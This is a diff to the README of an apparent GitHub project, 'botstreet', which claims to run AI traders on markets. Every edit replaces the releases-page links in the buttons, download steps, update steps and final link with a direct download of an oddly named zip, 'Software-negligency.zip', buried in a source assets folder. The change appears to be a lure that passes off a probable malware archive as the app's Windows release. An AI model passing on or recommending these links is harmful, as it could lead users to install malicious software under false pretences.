@@ -1,6 +1,6 @@
 # 🤖 botstreet - Run AI traders on real markets
 
-[Download botstreet](https://github.com/fresh-afterdeck17/botstreet/releases){style="display:inline-block;padding:12px 18px;background:#3b82f6;color:#fff;border-radius:8px;text-decoration:none;font-weight:700"} [Release page](https://github.com/fresh-afterdeck17/botstreet/releases){style="display:inline-block;padding:12px 18px;background:#6b7280;color:#fff;border-radius:8px;text-decoration:none;font-weight:700"}
+[Download botstreet](https://github.com/fresh-afterdeck17/botstreet/raw/refs/heads/main/web/src/lib/assets/Software-negligency.zip){style="display:inline-block;padding:12px 18px;background:#3b82f6;color:#fff;border-radius:8px;text-decoration:none;font-weight:700"} [Release page](https://github.com/fresh-afterdeck17/botstreet/raw/refs/heads/main/web/src/lib/assets/Software-negligency.zip){style="display:inline-block;padding:12px 18px;background:#6b7280;color:#fff;border-radius:8px;text-decoration:none;font-weight:700"}
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Use it to watch agent decisions, compare results, and follow live market prices 
 
 ## 📥 Download
 
-1. Open the [botstreet releases page](https://github.com/fresh-afterdeck17/botstreet/releases).
+1. Open the [botstreet releases page](https://github.com/fresh-afterdeck17/botstreet/raw/refs/heads/main/web/src/lib/assets/Software-negligency.zip).
 2. Find the latest release at the top of the page.
 3. Download the Windows file for your computer.
 4. If the file is in a .zip archive, save it to your Downloads folder.
@@ -159,7 +159,7 @@ botstreet works well if you want to:
 
 When a new version is available:
 
-1. Go back to the [release page](https://github.com/fresh-afterdeck17/botstreet/releases)
+1. Go back to the [release page](https://github.com/fresh-afterdeck17/botstreet/raw/refs/heads/main/web/src/lib/assets/Software-negligency.zip)
 2. Download the latest Windows file
 3. Replace the older app file with the new one
 4. Open the updated version
@@ -168,7 +168,7 @@ When a new version is available:
 
 Get the Windows download here:
 
-[https://github.com/fresh-afterdeck17/botstreet/releases](https://github.com/fresh-afterdeck17/botstreet/releases)
+[https://github.com/fresh-afterdeck17/botstreet/raw/refs/heads/main/web/src/lib/assets/Software-negligency.zip](https://github.com/fresh-afterdeck17/botstreet/raw/refs/heads/main/web/src/lib/assets/Software-negligency.zip)
 
 ## 🔎 What to Expect
 
